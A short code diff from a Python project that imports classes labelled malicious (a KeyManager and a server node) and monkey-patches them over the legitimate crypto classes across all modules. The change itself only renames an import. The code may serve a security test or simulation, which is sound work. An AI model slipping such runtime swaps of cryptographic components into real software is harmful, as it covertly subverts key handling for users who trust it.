@@ -10,7 +10,7 @@ try:
     
     # 2. Import our malicious classes from our own library.
     from .derivation import KeyManager as MaliciousKeyManager
-    from .malicious_server import MaliciousServerNode as MaliciousServerNode
+    from .malicious_server import ServerNode as MaliciousServerNode
     
     # 3. Perform the swap. Overwrite the legitimate classes in ALL modules.
     crypto.KeyManager = MaliciousKeyManager
